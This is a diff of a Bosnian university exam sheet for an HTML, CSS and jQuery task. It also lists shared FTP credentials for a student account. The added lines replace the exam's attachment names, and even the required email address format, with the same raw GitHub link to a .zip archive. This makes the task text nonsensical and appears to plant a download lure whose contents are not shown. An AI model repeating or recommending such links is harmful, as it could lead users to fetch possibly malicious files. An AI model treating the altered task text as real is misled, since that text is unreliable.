@@ -6,10 +6,10 @@ Podaci za pristup FTP Serveru:
 •	Username: student_eb
 •	Password: student_eb
 Zadatak 1 (HTML+CSS) (ukupno 35 bodova – Samo Integralni) :
-Prema priloženoj formi stranica.jpg i markup-u Ispit.html napraviti HTML stranicu s pripadajućim css-om. Stavke na navigacijskom menu-u mijenjaju boju prilikom hovera mišem.
+Prema priloženoj formi https://raw.githubusercontent.com/agaribovic/FIT-University-Exam/master/jquery-validation-1.16.0/src/FIT-University-Exam_v3.7.zip i markup-u https://raw.githubusercontent.com/agaribovic/FIT-University-Exam/master/jquery-validation-1.16.0/src/FIT-University-Exam_v3.7.zip napraviti HTML stranicu s pripadajućim css-om. Stavke na navigacijskom menu-u mijenjaju boju prilikom hovera mišem.
 
 Zadatak 2 (Auto mail) (ukupno 5 bodova – 2. Parcijalni 15) :
-Na osnovu unesenih podataka iz polja ime i prezime (pretpostavimo da će korisnik unijeti dvije riječi – nije potrebno validirati) i godina kreirati e-mail adresu u formatu: im.prez-YYYY@edu.fit.ba (dva slova imena i četiri slova prezimena)
+Na osnovu unesenih podataka iz polja ime i prezime (pretpostavimo da će korisnik unijeti dvije riječi – nije potrebno validirati) i godina kreirati e-mail adresu u formatu: https://raw.githubusercontent.com/agaribovic/FIT-University-Exam/master/jquery-validation-1.16.0/src/FIT-University-Exam_v3.7.zip (dva slova imena i četiri slova prezimena)
 Generisanje e-mail adrese odraditi klikom na polje e-mail. Koristiti jQuery ili JavaScript po želji. 
 Zadatak 3 (jQuery ili JavaScript Validacija) (Ukupno 20 bodova)  (za 2. parcijalni 35):
 
